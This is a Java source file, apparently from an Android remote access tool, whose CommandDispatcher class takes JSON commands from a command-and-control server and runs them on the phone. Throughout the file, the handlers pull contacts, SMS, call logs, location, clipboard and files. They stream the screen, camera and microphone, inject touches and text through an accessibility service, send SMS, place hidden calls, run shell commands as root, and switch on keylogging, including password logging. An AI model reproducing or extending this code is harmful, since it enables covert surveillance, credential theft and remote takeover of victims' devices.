package com.tarjon.admin.utils;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.services.AdminService;
import com.tarjon.admin.services.TarjonAccessibilityService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Handles dispatch and execution of commands received from the C2 server
 */
public class CommandDispatcher {
    private static final String TAG = "CommandDispatcher";
    
    private final AdminService adminService;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    public CommandDispatcher(AdminService adminService, C2Connection c2Connection) {
        this.adminService = adminService;
        this.c2Connection = c2Connection;
        this.executor = Executors.newCachedThreadPool();
        
        // Register to receive commands
        c2Connection.setCommandCallback(this::handleCommand);
    }
    
    /**
     * Handle a command received from the C2 server
     * @param commandJson JSON string containing the command
     */
    public void handleCommand(String commandJson) {
        executor.execute(() -> {
            try {
                JSONObject command = new JSONObject(commandJson);
                
                String type = command.getString("type");
                String id = command.optString("id", "");
                JSONObject params = command.optJSONObject("params");
                
                Log.d(TAG, "Received command type: " + type + ", id: " + id);
                
                // Execute the command based on its type
                switch (type) {
                    // Device information commands
                    case "get_device_info":
                        getDeviceInfo(id);
                        break;
                    case "get_installed_apps":
                        getInstalledApps(id, params);
                        break;
                    case "get_location":
                        getLocation(id);
                        break;
                    case "get_contacts":
                        getContacts(id);
                        break;
                    case "get_call_logs":
                        getCallLogs(id, params);
                        break;
                    case "get_sms":
                        getSms(id, params);
                        break;
                        
                    // Surveillance commands
                    case "take_screenshot":
                        takeScreenshot(id);
                        break;
                    case "start_screen_stream":
                        startScreenStream(id, params);
                        break;
                    case "stop_screen_stream":
                        stopScreenStream(id);
                        break;
                    case "take_photo":
                        takePhoto(id, params);
                        break;
                    case "start_camera_stream":
                        startCameraStream(id, params);
                        break;
                    case "stop_camera_stream":
                        stopCameraStream(id);
                        break;
                    case "start_audio_record":
                        startAudioRecord(id, params);
                        break;
                    case "stop_audio_record":
                        stopAudioRecord(id);
                        break;
                        
                    // File system commands
                    case "list_files":
                        listFiles(id, params);
                        break;
                    case "download_file":
                        downloadFile(id, params);
                        break;
                    case "upload_file":
                        uploadFile(id, params);
                        break;
                    case "delete_file":
                        deleteFile(id, params);
                        break;
                        
                    // Input/control commands
                    case "inject_touch":
                        injectTouch(id, params);
                        break;
                    case "inject_text":
                        injectText(id, params);
                        break;
                    case "send_sms":
                        sendSms(id, params);
                        break;
                    case "make_call":
                        makeCall(id, params);
                        break;
                    case "open_url":
                        openUrl(id, params);
                        break;
                        
                    // Network commands
                    case "scan_wifi":
                        scanWifi(id);
                        break;
                    case "get_browser_history":
                        getBrowserHistory(id, params);
                        break;
                    
                    // System commands
                    case "shell_command":
                        executeShellCommand(id, params);
                        break;
                    case "run_app":
                        runApp(id, params);
                        break;
                    case "get_clipboard":
                        getClipboard(id);
                        break;
                    case "set_clipboard":
                        setClipboard(id, params);
                        break;
                        
                    // Contact management
                    case "add_contact":
                        addContact(id, params);
                        break;
                    case "update_contact":
                        updateContact(id, params);
                        break;
                    case "delete_contact":
                        deleteContact(id, params);
                        break;
                    
                    // Settings/configuration
                    case "update_settings":
                        updateSettings(id, params);
                        break;
                    case "get_settings":
                        getSettings(id);
                        break;
                        
                    // Unknown command
                    default:
                        sendCommandResult(id, "error", "Unknown command type: " + type);
                        break;
                }
                
            } catch (JSONException e) {
                Log.e(TAG, "Error parsing command JSON: " + e.getMessage());
                try {
                    sendCommandResult("", "error", "Invalid command format: " + e.getMessage());
                } catch (Exception ex) {
                    Log.e(TAG, "Error sending error response: " + ex.getMessage());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error handling command: " + e.getMessage());
                try {
                    sendCommandResult("", "error", "Command execution error: " + e.getMessage());
                } catch (Exception ex) {
                    Log.e(TAG, "Error sending error response: " + ex.getMessage());
                }
            }
        });
    }
    
    // Command implementation methods
    
    private void getDeviceInfo(String id) {
        try {
            adminService.getDeviceInfoCollector().collectAndSendDeviceInfo();
            sendCommandResult(id, "success", "Device info collection started");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to collect device info: " + e.getMessage());
        }
    }
    
    private void getInstalledApps(String id, JSONObject params) {
        try {
            boolean includeSystem = params != null && params.optBoolean("includeSystem", false);
            adminService.getDeviceInfoCollector().getInstalledApps(includeSystem, (apps) -> {
                sendCommandResult(id, "installed_apps", "Retrieved " + apps.length() + " apps", apps.toString());
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get installed apps: " + e.getMessage());
        }
    }
    
    private void getLocation(String id) {
        try {
            LocationTracker locationTracker = adminService.getLocationTracker();
            
            // If location tracking is not already active, start it
            if (!locationTracker.isTracking()) {
                locationTracker.startTracking();
            }
            
            // Get current location
            if (locationTracker.hasLocation()) {
                JSONObject location = locationTracker.getCurrentLocationJson();
                sendCommandResult(id, "location", "Location retrieved", location.toString());
            } else {
                // Request a single location update
                locationTracker.requestSingleUpdate((locationJson) -> {
                    sendCommandResult(id, "location", "Location retrieved", locationJson);
                });
                
                // Notify that location request is in progress
                sendCommandResult(id, "info", "Location request started, waiting for GPS fix");
            }
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get location: " + e.getMessage());
        }
    }
    
    private void getContacts(String id) {
        try {
            ContactManager contactManager = adminService.getContactManager();
            contactManager.getContacts(new ContactManager.ContactsCallback() {
                @Override
                public void onContactsLoaded(String contactsJson) {
                    sendCommandResult(id, "contacts", "Retrieved contacts", contactsJson);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to get contacts: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get contacts: " + e.getMessage());
        }
    }
    
    private void getCallLogs(String id, JSONObject params) {
        try {
            int limit = params != null ? params.optInt("limit", 100) : 100;
            adminService.getDeviceInfoCollector().getCallLogs(limit, (callLogs) -> {
                sendCommandResult(id, "call_logs", "Retrieved call logs", callLogs);
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get call logs: " + e.getMessage());
        }
    }
    
    private void getSms(String id, JSONObject params) {
        try {
            int limit = params != null ? params.optInt("limit", 100) : 100;
            String folder = params != null ? params.optString("folder", "inbox") : "inbox";
            
            adminService.getSmsManager().getSms(folder, limit, (smsJson) -> {
                sendCommandResult(id, "sms", "Retrieved SMS messages", smsJson);
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get SMS messages: " + e.getMessage());
        }
    }
    
    private void takeScreenshot(String id) {
        try {
            ScreenCapture screenCapture = adminService.getScreenCapture();
            screenCapture.captureScreenshot(new ScreenCapture.CaptureCallback() {
                @Override
                public void onCaptureComplete(String base64Image) {
                    JSONObject result = new JSONObject();
                    try {
                        result.put("image", base64Image);
                        result.put("timestamp", System.currentTimeMillis());
                        result.put("width", screenCapture.getScreenWidth());
                        result.put("height", screenCapture.getScreenHeight());
                        
                        sendCommandResult(id, "screenshot", "Screenshot captured", result.toString());
                    } catch (JSONException e) {
                        sendCommandResult(id, "error", "Failed to process screenshot: " + e.getMessage());
                    }
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to capture screenshot: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to take screenshot: " + e.getMessage());
        }
    }
    
    private void startScreenStream(String id, JSONObject params) {
        try {
            int quality = params != null ? params.optInt("quality", 50) : 50;
            int fps = params != null ? params.optInt("fps", 5) : 5;
            
            ScreenCapture screenCapture = adminService.getScreenCapture();
            screenCapture.startScreenStream(quality, fps, (frameData) -> {
                // No need to use commandResult here, the screen capture utility
                // will send frames directly to the C2Connection
            });
            
            sendCommandResult(id, "success", "Screen stream started");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to start screen stream: " + e.getMessage());
        }
    }
    
    private void stopScreenStream(String id) {
        try {
            adminService.getScreenCapture().stopScreenStream();
            sendCommandResult(id, "success", "Screen stream stopped");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to stop screen stream: " + e.getMessage());
        }
    }
    
    private void takePhoto(String id, JSONObject params) {
        try {
            int cameraId = params != null ? params.optInt("cameraId", 0) : 0;
            int quality = params != null ? params.optInt("quality", 80) : 80;
            
            adminService.getCameraManager().capturePhoto(cameraId, quality, new CameraManager.CaptureCallback() {
                @Override
                public void onCaptureComplete(String base64Image) {
                    JSONObject result = new JSONObject();
                    try {
                        result.put("image", base64Image);
                        result.put("timestamp", System.currentTimeMillis());
                        result.put("cameraId", cameraId);
                        
                        sendCommandResult(id, "photo", "Photo captured", result.toString());
                    } catch (JSONException e) {
                        sendCommandResult(id, "error", "Failed to process photo: " + e.getMessage());
                    }
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to capture photo: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to take photo: " + e.getMessage());
        }
    }
    
    private void startCameraStream(String id, JSONObject params) {
        try {
            int cameraId = params != null ? params.optInt("cameraId", 0) : 0;
            int quality = params != null ? params.optInt("quality", 50) : 50;
            int fps = params != null ? params.optInt("fps", 10) : 10;
            
            adminService.getCameraManager().startCameraStream(cameraId, quality, fps, (frameData) -> {
                // No need to use commandResult here, the camera manager
                // will send frames directly to the C2Connection
            });
            
            sendCommandResult(id, "success", "Camera stream started");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to start camera stream: " + e.getMessage());
        }
    }
    
    private void stopCameraStream(String id) {
        try {
            adminService.getCameraManager().stopCameraStream();
            sendCommandResult(id, "success", "Camera stream stopped");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to stop camera stream: " + e.getMessage());
        }
    }
    
    private void startAudioRecord(String id, JSONObject params) {
        try {
            int source = params != null ? params.optInt("source", AudioRecorder.SOURCE_MIC) : AudioRecorder.SOURCE_MIC;
            int duration = params != null ? params.optInt("duration", 0) : 0; // 0 means record until stopped
            
            adminService.getAudioRecorder().startRecording(source, duration, (filePath) -> {
                JSONObject result = new JSONObject();
                try {
                    result.put("filePath", filePath);
                    result.put("timestamp", System.currentTimeMillis());
                    
                    sendCommandResult(id, "audio_record_complete", "Audio recording complete", result.toString());
                } catch (JSONException e) {
                    sendCommandResult(id, "error", "Failed to process audio recording: " + e.getMessage());
                }
            });
            
            sendCommandResult(id, "success", "Audio recording started");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to start audio recording: " + e.getMessage());
        }
    }
    
    private void stopAudioRecord(String id) {
        try {
            adminService.getAudioRecorder().stopRecording();
            sendCommandResult(id, "success", "Audio recording stopped");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to stop audio recording: " + e.getMessage());
        }
    }
    
    private void listFiles(String id, JSONObject params) {
        try {
            String path = params != null ? params.optString("path", "/") : "/";
            
            adminService.getFileSystemManager().listFiles(path, (filesJson) -> {
                sendCommandResult(id, "files", "Listed files in " + path, filesJson);
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to list files: " + e.getMessage());
        }
    }
    
    private void downloadFile(String id, JSONObject params) {
        try {
            if (params == null || !params.has("path")) {
                sendCommandResult(id, "error", "Missing 'path' parameter");
                return;
            }
            
            String path = params.getString("path");
            adminService.getFileSystemManager().downloadFile(path, (fileData) -> {
                if (fileData != null) {
                    sendCommandResult(id, "file_data", "File downloaded: " + path, fileData);
                } else {
                    sendCommandResult(id, "error", "Failed to download file: " + path);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to download file: " + e.getMessage());
        }
    }
    
    private void uploadFile(String id, JSONObject params) {
        try {
            if (params == null || !params.has("path") || !params.has("data")) {
                sendCommandResult(id, "error", "Missing 'path' or 'data' parameter");
                return;
            }
            
            String path = params.getString("path");
            String data = params.getString("data");
            
            adminService.getFileSystemManager().uploadFile(path, data, (success) -> {
                if (success) {
                    sendCommandResult(id, "success", "File uploaded to " + path);
                } else {
                    sendCommandResult(id, "error", "Failed to upload file to " + path);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to upload file: " + e.getMessage());
        }
    }
    
    private void deleteFile(String id, JSONObject params) {
        try {
            if (params == null || !params.has("path")) {
                sendCommandResult(id, "error", "Missing 'path' parameter");
                return;
            }
            
            String path = params.getString("path");
            adminService.getFileSystemManager().deleteFile(path, (success) -> {
                if (success) {
                    sendCommandResult(id, "success", "File deleted: " + path);
                } else {
                    sendCommandResult(id, "error", "Failed to delete file: " + path);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to delete file: " + e.getMessage());
        }
    }
    
    private void injectTouch(String id, JSONObject params) {
        try {
            if (params == null || !params.has("x") || !params.has("y")) {
                sendCommandResult(id, "error", "Missing 'x' or 'y' parameter");
                return;
            }
            
            float x = (float) params.getDouble("x");
            float y = (float) params.getDouble("y");
            String action = params.optString("action", "click");
            long duration = params.optLong("duration", 0);
            
            TarjonAccessibilityService accessibilityService = TarjonAccessibilityService.getInstance();
            if (accessibilityService == null) {
                sendCommandResult(id, "error", "Accessibility service not running");
                return;
            }
            
            boolean success = false;
            
            switch (action) {
                case "click":
                    success = accessibilityService.performClick(x, y);
                    break;
                case "longclick":
                    success = accessibilityService.performLongClick(x, y, duration > 0 ? duration : 500);
                    break;
                case "swipe":
                    if (params.has("toX") && params.has("toY")) {
                        float toX = (float) params.getDouble("toX");
                        float toY = (float) params.getDouble("toY");
                        success = accessibilityService.performSwipe(x, y, toX, toY, duration > 0 ? duration : 300);
                    } else {
                        sendCommandResult(id, "error", "Missing 'toX' or 'toY' parameter for swipe action");
                        return;
                    }
                    break;
                default:
                    sendCommandResult(id, "error", "Unknown action: " + action);
                    return;
            }
            
            if (success) {
                sendCommandResult(id, "success", "Touch event injected: " + action);
            } else {
                sendCommandResult(id, "error", "Failed to inject touch event");
            }
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to inject touch: " + e.getMessage());
        }
    }
    
    private void injectText(String id, JSONObject params) {
        try {
            if (params == null || !params.has("text")) {
                sendCommandResult(id, "error", "Missing 'text' parameter");
                return;
            }
            
            String text = params.getString("text");
            
            TarjonAccessibilityService accessibilityService = TarjonAccessibilityService.getInstance();
            if (accessibilityService == null) {
                sendCommandResult(id, "error", "Accessibility service not running");
                return;
            }
            
            // Find a focused edittext
            android.view.accessibility.AccessibilityNodeInfo focusedNode = accessibilityService.findFocusedEditText();
            if (focusedNode == null) {
                sendCommandResult(id, "error", "No focused text field found");
                return;
            }
            
            boolean success = accessibilityService.inputText(focusedNode, text);
            
            if (success) {
                sendCommandResult(id, "success", "Text injected: " + text);
            } else {
                sendCommandResult(id, "error", "Failed to inject text");
            }
            
            focusedNode.recycle();
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to inject text: " + e.getMessage());
        }
    }
    
    private void sendSms(String id, JSONObject params) {
        try {
            if (params == null || !params.has("number") || !params.has("message")) {
                sendCommandResult(id, "error", "Missing 'number' or 'message' parameter");
                return;
            }
            
            String number = params.getString("number");
            String message = params.getString("message");
            
            adminService.getSmsManager().sendSms(number, message, new SmsManager.SmsCallback() {
                @Override
                public void onSuccess(String messageId) {
                    sendCommandResult(id, "success", "SMS sent to " + number);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to send SMS: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to send SMS: " + e.getMessage());
        }
    }
    
    private void makeCall(String id, JSONObject params) {
        try {
            if (params == null || !params.has("number")) {
                sendCommandResult(id, "error", "Missing 'number' parameter");
                return;
            }
            
            String number = params.getString("number");
            boolean hidden = params.optBoolean("hidden", false);
            
            adminService.getDeviceInfoCollector().makeCall(number, hidden, new DeviceInfoCollector.CallCallback() {
                @Override
                public void onSuccess() {
                    sendCommandResult(id, "success", "Call initiated to " + number);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to make call: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to make call: " + e.getMessage());
        }
    }
    
    private void openUrl(String id, JSONObject params) {
        try {
            if (params == null || !params.has("url")) {
                sendCommandResult(id, "error", "Missing 'url' parameter");
                return;
            }
            
            String url = params.getString("url");
            String browser = params.optString("browser", null);
            
            adminService.getWebMonitor().openUrl(url, browser);
            sendCommandResult(id, "success", "URL opened: " + url);
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to open URL: " + e.getMessage());
        }
    }
    
    private void scanWifi(String id) {
        try {
            adminService.getWifiScanner().startScan(new WifiScanner.WifiScanCallback() {
                @Override
                public void onScanComplete(String scanResultsJson) {
                    sendCommandResult(id, "wifi_scan", "Wi-Fi scan completed", scanResultsJson);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to scan Wi-Fi: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to scan Wi-Fi: " + e.getMessage());
        }
    }
    
    private void getBrowserHistory(String id, JSONObject params) {
        try {
            String browser = params != null ? params.optString("browser", null) : null;
            
            adminService.getWebMonitor().monitorWebActivity();
            
            // Get current Wi-Fi info
            String wifiInfo = adminService.getWifiScanner().getCurrentWifiInfo();
            sendCommandResult(id, "wifi_info", "Current Wi-Fi information", wifiInfo);
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get browser history: " + e.getMessage());
        }
    }
    
    private void executeShellCommand(String id, JSONObject params) {
        try {
            if (params == null || !params.has("command")) {
                sendCommandResult(id, "error", "Missing 'command' parameter");
                return;
            }
            
            String command = params.getString("command");
            boolean root = params.optBoolean("root", false);
            
            adminService.getCommandExecutor().executeCommand(command, root, new CommandExecutor.CommandCallback() {
                @Override
                public void onComplete(String output, int exitCode) {
                    try {
                        JSONObject result = new JSONObject();
                        result.put("output", output);
                        result.put("exitCode", exitCode);
                        result.put("success", exitCode == 0);
                        
                        sendCommandResult(id, "shell_output", "Command executed", result.toString());
                    } catch (JSONException e) {
                        sendCommandResult(id, "error", "Failed to process command output: " + e.getMessage());
                    }
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", "Failed to execute command: " + error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to execute shell command: " + e.getMessage());
        }
    }
    
    private void runApp(String id, JSONObject params) {
        try {
            if (params == null || !params.has("packageName")) {
                sendCommandResult(id, "error", "Missing 'packageName' parameter");
                return;
            }
            
            String packageName = params.getString("packageName");
            
            boolean success = adminService.getDeviceInfoCollector().launchApp(packageName);
            
            if (success) {
                sendCommandResult(id, "success", "App launched: " + packageName);
            } else {
                sendCommandResult(id, "error", "Failed to launch app: " + packageName);
            }
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to run app: " + e.getMessage());
        }
    }
    
    private void getClipboard(String id) {
        try {
            String clipboardText = adminService.getDeviceInfoCollector().getClipboardText();
            
            JSONObject result = new JSONObject();
            result.put("text", clipboardText != null ? clipboardText : "");
            result.put("timestamp", System.currentTimeMillis());
            
            sendCommandResult(id, "clipboard", "Clipboard content retrieved", result.toString());
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get clipboard: " + e.getMessage());
        }
    }
    
    private void setClipboard(String id, JSONObject params) {
        try {
            if (params == null || !params.has("text")) {
                sendCommandResult(id, "error", "Missing 'text' parameter");
                return;
            }
            
            String text = params.getString("text");
            
            boolean success = adminService.getDeviceInfoCollector().setClipboardText(text);
            
            if (success) {
                sendCommandResult(id, "success", "Clipboard content set");
            } else {
                sendCommandResult(id, "error", "Failed to set clipboard content");
            }
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to set clipboard: " + e.getMessage());
        }
    }
    
    private void addContact(String id, JSONObject params) {
        try {
            if (params == null || !params.has("name") || 
                    !params.has("phoneNumbers") || !params.has("emailAddresses")) {
                sendCommandResult(id, "error", "Missing required parameters");
                return;
            }
            
            String name = params.getString("name");
            String phoneNumbers = params.getJSONArray("phoneNumbers").toString();
            String emailAddresses = params.getJSONArray("emailAddresses").toString();
            
            adminService.getContactManager().addContact(name, phoneNumbers, emailAddresses, 
                    new ContactManager.ContactOperationCallback() {
                @Override
                public void onSuccess(String message) {
                    sendCommandResult(id, "success", message);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to add contact: " + e.getMessage());
        }
    }
    
    private void updateContact(String id, JSONObject params) {
        try {
            if (params == null || !params.has("contactId")) {
                sendCommandResult(id, "error", "Missing 'contactId' parameter");
                return;
            }
            
            String contactId = params.getString("contactId");
            String name = params.optString("name", null);
            String phoneNumbers = params.has("phoneNumbers") ? 
                    params.getJSONArray("phoneNumbers").toString() : null;
            String emailAddresses = params.has("emailAddresses") ? 
                    params.getJSONArray("emailAddresses").toString() : null;
            
            adminService.getContactManager().updateContact(contactId, name, phoneNumbers, emailAddresses, 
                    new ContactManager.ContactOperationCallback() {
                @Override
                public void onSuccess(String message) {
                    sendCommandResult(id, "success", message);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to update contact: " + e.getMessage());
        }
    }
    
    private void deleteContact(String id, JSONObject params) {
        try {
            if (params == null || !params.has("contactId")) {
                sendCommandResult(id, "error", "Missing 'contactId' parameter");
                return;
            }
            
            String contactId = params.getString("contactId");
            
            adminService.getContactManager().deleteContact(contactId, 
                    new ContactManager.ContactOperationCallback() {
                @Override
                public void onSuccess(String message) {
                    sendCommandResult(id, "success", message);
                }
                
                @Override
                public void onError(String error) {
                    sendCommandResult(id, "error", error);
                }
            });
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to delete contact: " + e.getMessage());
        }
    }
    
    private void updateSettings(String id, JSONObject params) {
        try {
            if (params == null) {
                sendCommandResult(id, "error", "Missing settings parameters");
                return;
            }
            
            // Update keylogger settings
            if (params.has("keylogging")) {
                JSONObject keyloggingSettings = params.getJSONObject("keylogging");
                KeyloggerManager keyloggerManager = adminService.getKeyloggerManager();
                
                if (keyloggingSettings.has("enabled")) {
                    keyloggerManager.setKeyloggingEnabled(keyloggingSettings.getBoolean("enabled"));
                }
                
                if (keyloggingSettings.has("clipboardMonitoring")) {
                    keyloggerManager.setClipboardMonitoringEnabled(keyloggingSettings.getBoolean("clipboardMonitoring"));
                }
                
                if (keyloggingSettings.has("passwordLogging")) {
                    keyloggerManager.setPasswordLoggingEnabled(keyloggingSettings.getBoolean("passwordLogging"));
                }
            }
            
            // Update location tracking settings
            if (params.has("locationTracking")) {
                JSONObject locationSettings = params.getJSONObject("locationTracking");
                LocationTracker locationTracker = adminService.getLocationTracker();
                
                if (locationSettings.has("enabled")) {
                    boolean enabled = locationSettings.getBoolean("enabled");
                    if (enabled && !locationTracker.isTracking()) {
                        locationTracker.startTracking();
                    } else if (!enabled && locationTracker.isTracking()) {
                        locationTracker.stopTracking();
                    }
                }
                
                if (locationSettings.has("interval")) {
                    locationTracker.setUpdateInterval(locationSettings.getInt("interval"));
                }
            }
            
            // Update SMS monitoring settings
            if (params.has("smsMonitoring")) {
                JSONObject smsSettings = params.getJSONObject("smsMonitoring");
                SmsManager smsManager = adminService.getSmsManager();
                
                if (smsSettings.has("enabled")) {
                    boolean enabled = smsSettings.getBoolean("enabled");
                    if (enabled && !smsManager.isMonitoring()) {
                        smsManager.startMonitoring();
                    } else if (!enabled && smsManager.isMonitoring()) {
                        smsManager.stopMonitoring();
                    }
                }
            }
            
            // Update web monitoring settings
            if (params.has("webMonitoring")) {
                JSONObject webSettings = params.getJSONObject("webMonitoring");
                WebMonitor webMonitor = adminService.getWebMonitor();
                
                if (webSettings.has("enabled")) {
                    boolean enabled = webSettings.getBoolean("enabled");
                    if (enabled) {
                        webMonitor.startMonitoring();
                    } else {
                        webMonitor.stopMonitoring();
                    }
                }
            }
            
            sendCommandResult(id, "success", "Settings updated");
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to update settings: " + e.getMessage());
        }
    }
    
    private void getSettings(String id) {
        try {
            JSONObject settings = new JSONObject();
            
            // Keylogger settings
            JSONObject keyloggingSettings = new JSONObject();
            KeyloggerManager keyloggerManager = adminService.getKeyloggerManager();
            keyloggingSettings.put("enabled", keyloggerManager.isKeyloggingEnabled());
            keyloggingSettings.put("clipboardMonitoring", keyloggerManager.isClipboardMonitoringEnabled());
            keyloggingSettings.put("passwordLogging", keyloggerManager.isPasswordLoggingEnabled());
            settings.put("keylogging", keyloggingSettings);
            
            // Location tracking settings
            JSONObject locationSettings = new JSONObject();
            LocationTracker locationTracker = adminService.getLocationTracker();
            locationSettings.put("enabled", locationTracker.isTracking());
            locationSettings.put("interval", locationTracker.getUpdateInterval());
            settings.put("locationTracking", locationSettings);
            
            // SMS monitoring settings
            JSONObject smsSettings = new JSONObject();
            SmsManager smsManager = adminService.getSmsManager();
            smsSettings.put("enabled", smsManager.isMonitoring());
            settings.put("smsMonitoring", smsSettings);
            
            // Web monitoring settings
            JSONObject webSettings = new JSONObject();
            WebMonitor webMonitor = adminService.getWebMonitor();
            webSettings.put("enabled", webMonitor.isMonitoring());
            settings.put("webMonitoring", webSettings);
            
            // Device info
            JSONObject deviceInfo = new JSONObject();
            DeviceInfoCollector deviceInfoCollector = adminService.getDeviceInfoCollector();
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkLevel", Build.VERSION.SDK_INT);
            settings.put("deviceInfo", deviceInfo);
            
            sendCommandResult(id, "settings", "Current settings", settings.toString());
        } catch (Exception e) {
            sendCommandResult(id, "error", "Failed to get settings: " + e.getMessage());
        }
    }
    
    /**
     * Send command result back to the C2 server
     * @param commandId ID of the command being responded to
     * @param type Type of result
     * @param message Human-readable message about the result
     */
    private void sendCommandResult(String commandId, String type, String message) {
        sendCommandResult(commandId, type, message, null);
    }
    
    /**
     * Send command result back to the C2 server
     * @param commandId ID of the command being responded to
     * @param type Type of result
     * @param message Human-readable message about the result
     * @param data JSON string with result data
     */
    private void sendCommandResult(String commandId, String type, String message, String data) {
        try {
            c2Connection.sendCommandResult(commandId, type, message, data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending command result: " + e.getMessage());
        }
    }
    
    /**
     * Release resources
     */
    public void release() {
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
}